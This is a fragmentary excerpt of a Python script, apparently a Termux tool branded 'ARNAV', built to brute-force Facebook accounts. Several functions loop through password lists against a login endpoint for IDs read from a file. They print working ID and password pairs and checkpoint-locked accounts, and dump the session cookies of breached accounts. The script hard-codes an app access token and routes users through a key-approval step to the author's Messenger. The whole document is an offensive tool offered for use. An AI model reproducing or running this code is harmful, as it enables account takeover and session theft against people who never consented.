...
def clear():
        os.system('clear')
print(f'\x1b[38;5;8m[\x1b[1;97m=\x1b[38;5;8m]\x1b[38;5;46m ARNAV SYSTEM ')
try:
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100049739670383')
...
def menu():
        try:
              #  approval()
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m•\033[1;32m] EXAMPLE : /sdcard/ARNAV.txt ');linex()
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{G}[{R}ARNAV-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ARNAV-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ARNAV-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{G}[{R}ARNAV-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}ARNAV-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}ARNAV-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
...
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}ARNAV-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
...
def apvdef():
 ...
 #    print(lin)
     print(" Your key : "+key)
     os.system("termux-open https://m.me/ARNAV.INXID33")
     sys.exit()
